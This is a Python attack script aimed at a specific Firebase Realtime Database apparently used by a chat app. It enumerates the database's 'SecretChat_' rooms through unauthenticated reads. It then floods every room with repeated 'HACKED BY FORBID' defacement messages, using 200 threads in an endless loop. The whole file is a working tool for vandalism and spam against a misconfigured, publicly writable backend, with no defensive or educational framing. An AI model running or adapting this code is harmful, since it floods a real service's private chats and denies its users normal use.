import time
import requests
from concurrent.futures import ThreadPoolExecutor

database_url = "https://itmeans-chat-4df62-default-rtdb.asia-southeast1.firebasedatabase.app"

headers = {
    "Content-Type": "application/json"
}

print("[FORBID] Exact Payload Broadcaster Initialized...")

session = requests.Session()

def blast_room(room_url):
    try:
        # Rapid micro-burst of your exact payload configuration
        for i in range(5):
            payload = {
                "Sender": "FORBID",
                "Message": "⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️",
                "Text": "⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️⚠️ HACKED BY FORBID | DISCORD: forbiddenway ⚠️",
                "Timestamp": int(time.time() * 1000) + i,
                "Aura": "voidWings",
                "Color": "red"
            }
            session.post(room_url, json=payload, headers=headers, timeout=1)
    except Exception:
        pass

while True:
    try:
        root_response = session.get(f"{database_url}/.json", timeout=3)
        
        if root_response.status_code == 200:
            data = root_response.json()
            if isinstance(data, dict):
                room_urls = [
                    f"{database_url}/{key}.json" 
                    for key in data.keys() 
                    if key.startswith("SecretChat_")
                ]
                
                if room_urls:
                    with ThreadPoolExecutor(max_workers=200) as executor:
                        executor.map(blast_room, room_urls)
                    print(f"[FORBID] Exact payload burst delivered to {len(room_urls)} active servers!")
                    
    except Exception as e:
        print(f"[FORBID] Loop error: {e}")
        
    time.sleep(1.5)
